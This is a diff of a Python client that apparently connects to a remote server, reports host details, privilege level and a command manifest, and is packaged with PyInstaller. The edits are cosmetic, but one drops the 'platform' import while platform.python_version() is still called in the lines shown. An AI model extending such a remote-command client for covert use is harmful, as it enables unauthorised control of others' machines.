@@ -1,13 +1,10 @@
-import json
 import os
-import platform
 import queue
 import socket
 import sys
 import threading
 import time
 import uuid
-
 
 from client.config.runtime_config import HTTP_TRANSFER_MODE, PYTHON_EXECUTION_MODE
 from client.connection.server_connection import ServerConnection
@@ -24,7 +21,8 @@ from client.config.config import (
     SERVER_ADDR,
 )
 
-from client.config.runtime_config import RECONNECT_INTERVAL_SECONDS,REMOTE_HTTP_WATCHDOG_ENABLED, LOCAL_WATCHDOG_ENABLED
+from client.config.runtime_config import RECONNECT_INTERVAL_SECONDS, REMOTE_HTTP_WATCHDOG_ENABLED, \
+    LOCAL_WATCHDOG_ENABLED
 
 # 强制导入所有平台模块，让 PyInstaller 检测到
 from client.commands.platform.mac import MacCommands
@@ -146,7 +144,7 @@ class Client:
             username = ""
             process_name = ""
 
-        info= {
+        info = {
             'id': self.client_id,
             'type': 'info',
 
@@ -176,7 +174,6 @@ class Client:
             'integrity': check_privilege(),
             'cwd': os.getcwd(),
 
-
             'python_ver': platform.python_version(),
 
             'http_transfer_mode': HTTP_TRANSFER_MODE,
@@ -186,7 +183,7 @@ class Client:
             'command_manifest': command_manifest,
             'system_paths': get_system_paths(),
         }
-        print(json.dumps(info, indent=2))
+        # print(json.dumps(info, indent=2))
         return info
 
     def _connect_socket(self):
